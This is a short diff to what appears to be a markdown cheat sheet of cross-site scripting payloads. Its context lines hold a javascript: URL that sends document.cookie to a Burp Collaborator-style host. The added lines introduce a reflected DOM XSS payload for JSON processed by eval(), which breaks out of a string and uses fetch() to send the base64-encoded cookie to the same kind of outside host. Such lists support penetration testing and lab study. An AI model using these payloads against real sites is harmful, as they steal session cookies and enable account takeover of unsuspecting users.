@@ -6,6 +6,11 @@
 ```Javascript
 JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie
 ```  
+>Reflected DOM XSS, into JSON data that is processed by **eval().**  
+
+```JavaScript
+\"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//
+```  
 
 ```Javascript
 <script>
